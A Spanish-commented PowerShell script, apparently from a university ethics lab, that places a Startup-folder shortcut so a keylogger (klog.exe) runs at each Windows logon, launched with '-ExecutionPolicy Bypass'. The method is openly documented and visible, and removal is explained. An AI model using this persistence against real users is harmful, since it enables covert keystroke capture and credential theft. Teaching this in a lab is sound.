# install-autostart.ps1
# Crea un acceso directo en la carpeta de Inicio del usuario actual
# para que el keylogger (klog.exe) arranque al iniciar sesion en Windows.
#
# Metodo: shortcut en %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
#   - Es el metodo documentado por Microsoft.
#   - Aparece listado en Administrador de tareas > Inicio.
#   - Se desinstala borrando el shortcut (ver uninstall-autostart.ps1).
#   - No requiere permisos de administrador.
#
# Uso:
#   powershell -ExecutionPolicy Bypass -File .\install-autostart.ps1 [-ExePath "C:\ruta\klog.exe"]
#
# Si no se pasa -ExePath, busca klog.exe junto a este script o un nivel por encima.

param(
    [string]$ExePath = "",
    [string]$ShortcutName = "KeyloggerLab.lnk"
)

$ErrorActionPreference = "Stop"

function Resolve-ExePath {
    param([string]$given)
    if ($given -and (Test-Path $given)) {
        return (Resolve-Path $given).Path
    }
    $here = Split-Path -Parent $MyInvocation.MyCommand.Path
    $candidates = @(
        (Join-Path $here "klog.exe"),
        (Join-Path (Split-Path $here -Parent) "klog.exe"),
        (Join-Path (Split-Path (Split-Path $here -Parent) -Parent) "klog.exe")
    )
    foreach ($c in $candidates) {
        if (Test-Path $c) { return (Resolve-Path $c).Path }
    }
    throw "No se encontro klog.exe. Pasalo con -ExePath 'C:\ruta\klog.exe'."
}

$exe = Resolve-ExePath $ExePath
$startup = [Environment]::GetFolderPath("Startup")
if (-not (Test-Path $startup)) {
    throw "No existe la carpeta de inicio: $startup"
}
$shortcutPath = Join-Path $startup $ShortcutName

$shell = New-Object -ComObject WScript.Shell
$sc = $shell.CreateShortcut($shortcutPath)
$sc.TargetPath       = $exe
$sc.WorkingDirectory = Split-Path -Parent $exe
$sc.Description      = "Keylogger (laboratorio etico - Universidad de Deusto)"
$sc.WindowStyle      = 1   # 1 = ventana normal visible
$sc.Save()

Write-Host "Autostart instalado:"
Write-Host "  Shortcut:    $shortcutPath"
Write-Host "  Apunta a:    $exe"
Write-Host ""
Write-Host "Comprobaciones:"
Write-Host "  - Administrador de tareas > Inicio: deberia aparecer '$ShortcutName'"
Write-Host "  - Para desinstalar: ejecuta uninstall-autostart.ps1 o borra el shortcut."
